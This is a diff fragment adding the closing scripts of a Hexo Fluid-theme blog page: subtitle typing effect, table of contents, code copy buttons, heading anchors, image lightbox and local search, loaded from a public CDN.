+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/Decemberus.github-io/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/Decemberus.github-io/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/Decemberus.github-io/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
